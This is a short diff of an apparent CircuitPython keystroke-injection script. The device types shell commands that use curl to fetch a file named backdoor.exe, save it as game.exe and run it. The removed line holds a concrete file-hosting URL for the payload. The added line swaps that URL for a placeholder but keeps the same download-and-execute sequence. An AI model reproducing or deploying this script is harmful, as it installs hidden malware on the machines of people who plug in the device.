@@ -18,7 +18,7 @@ while S < 2:
     keyboard.press(Keycode.ENTER)
     keyboard.release_all()
     time.sleep(1)
-    keyboard_layout.write("curl https://download1645.mediafire.com/k6q51h8cz1dg/rfgtmorlhf5tc6z/backdoor.exe --output game.exe\n")
+    keyboard_layout.write("curl "backdoor link" --output game.exe\n")
     keyboard_layout.write("game.exe\n")
     keyboard_layout.write("exit\n")
     S = S+1
